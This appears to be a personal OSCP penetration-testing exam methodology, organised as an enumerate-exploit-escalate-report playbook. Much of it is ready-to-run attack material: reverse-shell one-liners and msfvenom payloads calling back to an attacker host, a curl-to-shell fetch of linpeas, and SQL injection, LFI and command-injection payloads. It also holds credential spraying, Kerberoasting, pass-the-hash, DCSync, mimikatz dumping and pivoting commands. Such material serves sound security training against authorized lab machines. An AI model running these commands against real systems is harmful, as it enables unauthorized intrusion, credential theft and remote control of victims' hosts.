# My OSCP Methodology

A repeatable process for the exam, not a bag of tricks. The whole thing runs on one loop — **enumerate → exploit → escalate → report** — and the discipline is doing every step completely before deciding a box is hard. On the exam "stuck" almost always means "under-enumerated," so the process front-loads the boring, thorough part.

Ground rules I hold the whole time: take notes constantly (IP, ports, creds, hashes, paths, command output), time-box each machine to ~90 minutes and move on when I stall, and screenshot every proof with `hostname` + `whoami`/`id` next to the flag.

Conventions below: `$IP` target, `$LHOST`/`$LPORT` my box, `$DOMAIN` the AD domain, `$ROCKYOU` the rockyou list, `$WL` my SecLists root.

---

## 1 · Enumeration

_The exam hands you an IP. Everything after depends on how completely you read it — so I scan everything, re-read everything, and assume I missed something._

There's no OSINT here, no subdomains to hunt, no Shodan. You get an IP and a mandate, and the box is almost always beatable with what a thorough scan hands you. So I scan the full port range every time, always run UDP, and re-read the output before I reach for a single exploit.

**Ports.** Full TCP first, then detail the ports that answered. UDP top-100 always — SNMP and TFTP win boxes a TCP-only scan never sees.

```bash
# Full TCP — version + default scripts
nmap -sC -sV -p- --min-rate 5000 -oA nmap/full $IP

# UDP top 100 — don't skip it
nmap -sU --top-ports 100 -oA nmap/udp $IP
```

**Then service by service.** Every open port is its own checklist. The three that carry most OSCP boxes:

```bash
# Web — directories, files, backups
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak

# SMB — null sessions, shares, users
enum4linux -a $IP
smbmap -H $IP
nxc smb $IP -u '' -p ''

# LDAP / AD
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local"
```

Quick triage for the rest: FTP (`ftp $IP` — anonymous login, writable dirs), SNMP (`snmpwalk -v2c -c public $IP`), NFS (`showmount -e $IP`), MySQL (`mysql -u root -h $IP` — blank password), WinRM (`evil-winrm -i $IP -u user -p pass`).

**Read before you exploit.** Nmap script output, service versions, banners, gobuster hits — the way in is usually sitting in output I already have. `searchsploit <service> <version>` on anything that looks dated.

**Checklist**

- [ ] Full TCP scan (`-p-`)
- [ ] UDP top-ports
- [ ] Version + default-script scan on open ports
- [ ] Web: gobuster/ffuf with extensions
- [ ] SMB: null session, shares, users
- [ ] Every other service triaged against its quick-ref
- [ ] `searchsploit` each service + version
- [ ] All output saved (`-oA`) and re-read before exploiting

---

## 2 · Initial Access

_The service is enumerated; now I turn it into a foothold. Public exploit first if the version is vulnerable, otherwise the web and credential angles._

I always check `searchsploit` before doing anything clever — a matching CVE is the fastest way in and there's no bonus for the hard road. Failing that, the web app and weak credentials carry most footholds.

```bash
# Known-version exploits first
searchsploit <service> <version>
searchsploit -x <EDB-ID>          # examine before running
searchsploit -m <EDB-ID>          # copy to cwd
```

**Web exploitation.** The OSCP web set is small and predictable:

```bash
# SQL injection
sqlmap -u "http://$IP/page?id=1" --dbs --batch
# manual:  ' OR '1'='1--    UNION SELECT NULL,NULL--

# LFI → source disclosure / log poisoning
http://$IP/page.php?file=php://filter/convert.base64-encode/resource=index
http://$IP/page.php?file=../../../../etc/passwd

# Command injection
;id     |id     &&id     `id`     $(id)

# File upload — bypass filters: .phtml / .pHp, Content-Type, GIF89a; magic bytes, %00
```

**Credential attacks.** Spray what enumeration handed me, usernames as passwords first:

```bash
hydra -l admin -P $ROCKYOU $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P $ROCKYOU ssh://$IP
nxc smb $IP -u users.txt -p users.txt --no-bruteforce            # user = pass
nxc smb $IP -u users.txt -p $ROCKYOU --continue-on-success
```

---

## 3 · Foothold & Shell

_Catch the shell, then make it a shell I can actually work in._

First thing after a callback is stabilization — a raw `nc` shell with no TTY loses me the box the moment I fat-finger Ctrl-C.

```bash
# Reverse shells
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Stabilize (Linux)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z  →  stty raw -echo; fg  →  reset
export TERM=xterm; export SHELL=bash; stty rows 50 columns 200
```

**Payloads when I need a file, not a one-liner:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe  -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=$LHOST LPORT=$LPORT -f elf  -o shell.elf
msfvenom -p php/reverse_php               LHOST=$LHOST LPORT=$LPORT -f raw  -o shell.php
```

**File transfer both ways:**

```bash
python3 -m http.server 8000                              # serve
impacket-smbserver -smb2support share .                  # \\$LHOST\share

wget http://$LHOST:8000/file                             # Linux recv
certutil -urlcache -f http://$LHOST:8000/f.exe f.exe     # Windows recv
powershell iwr http://$LHOST/f -OutFile C:\Temp\f
```

---

## 4 · Privilege Escalation

_User to root/SYSTEM. Automated triage to catch the obvious, then the manual checks that actually win — because the intended path is often something linpeas flags in yellow, not red._

**Linux.**

```bash
curl http://$LHOST/linpeas.sh | sh | tee linpeas.out
pspy64                                    # watch cron / processes

sudo -l                                   # → GTFOBins for any allowed binary
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # capabilities
cat /etc/crontab; ls -la /etc/cron*
find / -writable -type f 2>/dev/null | grep -v proc
```

Usual paths: sudo/GTFOBins, vulnerable/custom SUID, writable cron, capabilities (`cap_setuid`), docker group, writable `/etc/passwd`, PATH hijack, kernel exploit (`uname -a` → searchsploit).

**Windows.**

```bash
.\winpeas.exe > winpeas.txt
whoami /priv                              # the Se* privileges are the win
whoami /groups
accesschk.exe -uwcqv "Everyone" * /accepteula     # weak service perms
schtasks /query /fo LIST /v
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"   # unquoted paths
```

`SeImpersonatePrivilege` → `PrintSpoofer.exe -i -c cmd` or `GodPotato`. `SeBackupPrivilege` → dump SAM/SYSTEM → `secretsdump.py -sam SAM -system SYSTEM LOCAL`. AlwaysInstallElevated → `msiexec /quiet /qn /i evil.msi`.

**Checklist**

- [ ] Automated scan (linpeas/winpeas) — read yellow, not just red
- [ ] `sudo -l` / `whoami /priv`
- [ ] SUID/SGID / weak service perms
- [ ] cron / scheduled tasks
- [ ] writable files, PATH, stored creds
- [ ] kernel/OS version → searchsploit

---

## 5 · Active Directory

_The assumed-breach set. One set of creds is the door; BloodHound draws the path from there to Domain Admin._

```bash
# Map it first
bloodhound-python -u user -p 'pass' -d $DOMAIN -c All -ns $IP --zip
```

In BloodHound: shortest paths to DA, AS-REP-roastable users, Kerberoastable users.

```bash
# Kerberoasting
GetUserSPNs.py $DOMAIN/user:'pass' -dc-ip $IP -request -outputfile spns.txt
hashcat -m 13100 spns.txt $ROCKYOU

# AS-REP roasting (no preauth)
GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP -outputfile asrep.txt
hashcat -m 18200 asrep.txt $ROCKYOU

# Pass-the-Hash
nxc smb $IP -u Administrator -H <NTLM>
evil-winrm -i $IP -u Administrator -H <NTLM>
psexec.py -hashes :<NTLM> Administrator@$IP

# DCSync to domain
secretsdump.py $DOMAIN/user:'pass'@$IP
```

Clock skew bites Kerberos — `sudo ntpdate $IP` before the impacket calls.

---

## 6 · Pivoting & Post-Exploitation

_Loot the box, then use it as a doorway to the network behind it._

**Harvest first** — every credential and hash is a key to the next host:

```bash
# Linux
unshadow /etc/passwd /etc/shadow > hashes.txt
hashcat -m 1800 hashes.txt $ROCKYOU

# Windows
mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Hashcat modes I actually use: `1000` NTLM, `1800` sha512crypt, `13100` Kerberoast, `18200` AS-REP, `5600` NetNTLMv2.

**Pivot** into the internal subnet the foothold can reach:

```bash
# SSH
ssh -L 9001:$INTERNAL:445 user@$IP        # local forward
ssh -D 1080 user@$IP                       # SOCKS proxy

# Chisel (when there's no SSH)
# attacker:  chisel server -p 8001 --reverse
# victim:    chisel client $LHOST:8001 R:1080:socks

# Route tools through it
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -Pn $INTERNAL
```

---

## 7 · Reporting

_The box isn't done until it's documented. Per machine, I keep it to the sections the exam actually grades._

1. **Executive Summary** — brief, non-technical.
2. **Machine Overview** — IP, hostname, OS, difficulty.
3. **Attack Narrative** — step by step, screenshot each pivot in the chain.
4. **Proof** — `hostname` + `whoami`/`id` + `cat proof.txt` in one frame.
5. **Vulnerability Summary** — CVE / root cause.
6. **Remediation** — one sentence per finding.

Every screenshot shows machine context (`id`/`whoami`, `hostname`); proof shots must show the flag and the host in the same frame. Build the report as I go, not at 3 a.m. after the clock stops.

```bash
pandoc report.md -o report.pdf --pdf-engine=xelatex
flameshot gui -p ~/oscp/$IP/screenshots/
```

---

## Appendix · When Stuck & BoF

**Unstuck protocol** — run in order: re-enumerate (all ports? UDP? other wordlists?) → re-read every scrap of output → check exact version numbers against searchsploit/GitHub → default creds → read source / config / `.git` / `.env` → Google the exact error → switch vector (web stuck → SMB/FTP) → short break → paste raw output and what I tried.

**Buffer overflow** — the current OSCP exam dropped the dedicated BoF machine, so this is only here in case one appears: fuzz to crash → pattern offset → confirm EIP → bad chars → `!mona jmp -r esp` → generate shellcode with the bad chars excluded → NOPs + shellcode → fire.
